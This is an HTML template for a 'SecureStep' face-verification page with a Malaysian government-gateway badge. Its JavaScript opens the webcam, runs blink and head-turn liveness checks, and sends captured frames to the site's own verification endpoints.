<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Face Verification | SecureStep</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <script>
        // --- GLOBAL TIMEOUT: AUTO-REDIRECT ---
        document.addEventListener('DOMContentLoaded', function () {
            const remaining = parseInt("{{ timeout|default(90) }}");
            console.log("Session Timeout in:", remaining, "seconds");

            if (remaining <= 0) {
                window.location.href = "/login?alert=timeout";
            } else {
                setTimeout(() => {
                    window.location.href = "/login?alert=timeout";
                }, remaining * 1000);

                // Optional: Visible Countdown could go here
                startVisibleTimer(remaining);
            }
        });

        function startVisibleTimer(seconds) {
            // If there's an element with id 'timer-display', update it
            let sec = Math.floor(seconds);
            const interval = setInterval(() => {
                sec--;
                const el = document.getElementById('timer-display');
                if (el) el.innerText = sec + "s";
                if (sec <= 0) clearInterval(interval);
            }, 1000);
        }
    </script>
    <style>
        body {
            background-color: #0f172a;
            /* Deep Navy/Black */
            color: white;
            font-family: 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .security-container {
            text-align: center;
            max-width: 500px;
            width: 100%;
            padding: 40px;
            position: relative;
        }

        /* Branding */
        .official-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 30px;
            opacity: 0.7;
            font-size: 12px;
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        .lock-icon {
            font-size: 50px;
            color: #ef4444;
            /* Red initially */
            margin-bottom: 20px;
            transition: all 0.5s ease;
        }

        h1 {
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 10px;
            letter-spacing: 0.5px;
        }

        p {
            color: #94a3b8;
            font-size: 15px;
            margin-bottom: 40px;
            line-height: 1.5;
        }

        /* --- THE SCANNER WINDOW --- */
        .scanner-frame {
            width: 240px;
            height: 240px;
            border: 2px solid #334155;
            border-radius: 50%;
            /* Circle */
            margin: 0 auto 30px;
            position: relative;
            overflow: hidden;
            background: #1e293b;
            box-shadow: 0 0 40px rgba(0, 0, 0, 0.5);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* WEBCAM VIDEO LAYER */
        #webcam {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
            /* Mirror effect */
            z-index: 1;
            display: none;
            /* Hidden until started */
        }

        /* FALLBACK ICON */
        .user-silhouette {
            font-size: 100px;
            color: #334155;
            transition: color 0.5s;
            z-index: 0;
        }

        /* Laser Scan Animation */
        .scan-laser {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: #0ea5e9;
            /* Bright Blue */
            box-shadow: 0 0 15px #0ea5e9;
            animation: scanDown 1.5s infinite linear;
            display: none;
            /* Hidden until activated */
            z-index: 2;
            /* On top of video */
        }

        @keyframes scanDown {
            0% {
                top: -10%;
                opacity: 0;
            }

            10% {
                opacity: 1;
            }

            90% {
                opacity: 1;
            }

            100% {
                top: 110%;
                opacity: 0;
            }
        }

        /* --- BUTTON --- */
        .btn-verify {
            background: #0ea5e9;
            color: white;
            border: none;
            padding: 14px 35px;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            box-shadow: 0 4px 15px rgba(14, 165, 233, 0.3);
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }

        .btn-verify:hover {
            background: #0284c7;
            transform: translateY(-2px);
        }

        .btn-verify:disabled {
            background: #475569;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .status-msg {
            margin-top: 25px;
            min-height: 20px;
            font-size: 14px;
            color: #0ea5e9;
            font-weight: 500;
        }

        /* Success State */
        .success-mode .lock-icon {
            color: #10b981;
            transform: scale(1.1);
        }

        .success-mode .scanner-frame {
            border-color: #10b981;
            box-shadow: 0 0 30px rgba(16, 185, 129, 0.3);
        }

        /* Note: We keep the video visible, or we could hide it if preferred */
    </style>
</head>

<body>

    <div class="security-container">
        <div class="official-badge">
            <img src="https://flagcdn.com/w40/my.png" alt="Malaysia" style="width: 20px; border-radius: 2px;">
            Government Secure Gateway
        </div>
        <div class="header-icon">
            <i class="fas fa-lock" id="lockIcon"></i>
        </div>
        <h2>Biometric Verification</h2>

        <!-- VISIBLE TIMER -->
        <div style="text-align: center; margin-bottom: 15px;">
            <span style="font-size: 14px; color: #94a3b8;">Session expires in:</span>
            <span id="timer-display"
                style="font-weight: bold; color: #f59e0b; font-family: monospace; font-size: 16px;">90s</span>
        </div>

        <p>This document vault is protected.<br>Please complete the biometric scan to proceed.</p>

        <div class="scanner-frame" id="scannerFrame">
            <video id="webcam" autoplay playsinline></video>

            <i class="fas fa-user user-silhouette" id="userIcon"></i>

            <div class="scan-laser" id="scanLaser"></div>
        </div>

        <button class="btn-verify" id="startBtn" onclick="initCameraAndScan()">
            <i class="fas fa-user"></i> Start Face Scan
        </button>

        <div class="status-msg" id="statusMsg"></div>
    </div>

    <script>
        let stream = null;
        let isLivenessCheckActive = false;
        let isHeadTurnCheckActive = false;
        let livenessTimeout = null;
        let challengeDirection = 'left'; // Define the challenge

        async function initCameraAndScan() {
            const btn = document.getElementById('startBtn');
            const status = document.getElementById('statusMsg');
            const video = document.getElementById('webcam');

            // 1. Disable Button & Update Status
            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Initializing Camera...';
            status.innerText = "Requesting optical sensor access...";

            try {
                // 2. Request Camera Permission
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });
                video.srcObject = stream;
                video.style.display = "block"; // Show the video element

                status.innerText = "Camera Active. Align face.";

                // 3. Start Liveness Check Steps
                setTimeout(startLivenessCheck, 1500);

            } catch (err) {
                console.error("Camera Error:", err);
                status.innerText = "Error: Camera Access Denied.";
                status.style.color = "#ef4444";
                btn.innerHTML = '<i class="fas fa-exclamation-circle"></i> Camera Failed';
                btn.disabled = false;
            }
        }

        async function startLivenessCheck() {
            const status = document.getElementById('statusMsg');
            const laser = document.getElementById('scanLaser');

            // STEP 1: BLINK
            status.innerHTML = "LIVENESS 1/2: Please <b style='color: #0ea5e9;'>BLINK</b> naturally.";
            status.style.color = "white";
            laser.style.display = 'block';

            isLivenessCheckActive = true;
            checkBlinkLoop();

            // Global Timeout (20s total for all steps)
            livenessTimeout = setTimeout(() => {
                if (isLivenessCheckActive || isHeadTurnCheckActive) {
                    stopScan();
                    status.innerText = "Liveness Check Failed: Timeout.";
                    status.style.color = "#ef4444";
                    document.getElementById('startBtn').disabled = false;
                    document.getElementById('startBtn').innerHTML = '<i class="fas fa-redo"></i> Retry Scan';
                }
            }, 25000);
        }

        async function checkBlinkLoop() {
            if (!isLivenessCheckActive) return;

            const blob = await captureFrame(0.7);
            if (!blob) return;

            const formData = new FormData();
            formData.append('image', blob, 'frame.jpg');

            try {
                const response = await fetch('/check-blink', { method: 'POST', body: formData });
                const result = await response.json();

                if (result.blink) {
                    // BLINK SUCCESS -> NEXT STEP
                    isLivenessCheckActive = false;

                    document.getElementById('statusMsg').innerText = "Blink Verified! Preparing next step...";
                    document.getElementById('statusMsg').style.color = "#10b981";

                    setTimeout(startHeadTurnCheck, 1000);

                } else {
                    if (isLivenessCheckActive) setTimeout(checkBlinkLoop, 300);
                }

            } catch (e) {
                if (isLivenessCheckActive) setTimeout(checkBlinkLoop, 500);
            }
        }

        async function startHeadTurnCheck() {
            const status = document.getElementById('statusMsg');
            // STEP 2: HEAD TURN
            status.innerHTML = `LIVENESS 2/2: Turn Head to the <b style='color: #0ea5e9;'>SIDE</b> to verify.`;
            status.style.color = "white";

            isHeadTurnCheckActive = true;
            checkHeadTurnLoop();
        }

        async function checkHeadTurnLoop() {
            if (!isHeadTurnCheckActive) return;

            const blob = await captureFrame(0.5); // Fast capture
            if (!blob) return;

            const formData = new FormData();
            formData.append('image', blob, 'frame.jpg');

            try {
                const response = await fetch('/check-pose', { method: 'POST', body: formData });
                const result = await response.json();

                // Accept EITHER left or right turn
                if (result.direction === 'left' || result.direction === 'right') {
                    // TURN SUCCESS
                    isHeadTurnCheckActive = false;
                    clearTimeout(livenessTimeout);

                    document.getElementById('statusMsg').innerText = "Pose Verified! Look at camera...";
                    document.getElementById('statusMsg').style.color = "#10b981";

                    // Wait for user to look back
                    setTimeout(performFaceVerification, 2000);
                } else {
                    if (isHeadTurnCheckActive) setTimeout(checkHeadTurnLoop, 300);
                }
            } catch (e) {
                if (isHeadTurnCheckActive) setTimeout(checkHeadTurnLoop, 500);
            }
        }

        async function captureFrame(quality) {
            const video = document.getElementById('webcam');
            const canvas = document.createElement('canvas');
            canvas.width = 320;
            canvas.height = 240;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', quality));
        }

        async function performFaceVerification() {
            const btn = document.getElementById('startBtn');
            const laser = document.getElementById('scanLaser');
            const status = document.getElementById('statusMsg');
            const container = document.querySelector('.security-container');
            const video = document.getElementById('webcam');

            status.innerText = "Analyzing Texture & Biometric Depth...";
            status.style.color = "#0ea5e9";

            // Capture High Res
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                if (!blob) {
                    status.innerText = "Capture failed.";
                    stopScan();
                    return;
                }

                const formData = new FormData();
                formData.append('image', blob, 'face_scan.jpg');

                try {
                    const response = await fetch('/verify-face', { method: 'POST', body: formData });
                    const result = await response.json();

                    if (result.status === 'success') {
                        // SUCCESS
                        laser.style.display = 'none';
                        container.classList.add('success-mode');
                        document.getElementById('lockIcon').className = "fas fa-lock-open lock-icon";
                        status.innerText = "ACCESS GRANTED. Redirecting...";
                        status.style.color = "#10b981";
                        btn.style.display = 'none';
                        setTimeout(() => { window.location.href = "/step-complete"; }, 1000);
                    } else {
                        // FAIL
                        status.innerText = "Verification Failed: " + result.message;
                        status.style.color = "#ef4444";
                        stopScan();
                        btn.disabled = false;
                        btn.innerHTML = '<i class="fas fa-user"></i> Retry Face Scan';
                    }
                } catch (error) {
                    status.innerText = "Server Connection Error.";
                    stopScan();
                    btn.disabled = false;
                    btn.innerHTML = '<i class="fas fa-redo"></i> Retry';
                }
            }, 'image/jpeg', 0.9);
        }

        function stopScan() {
            document.getElementById('scanLaser').style.display = 'none';
            isLivenessCheckActive = false;
            isHeadTurnCheckActive = false;
        }
    </script>
</body>

</html>
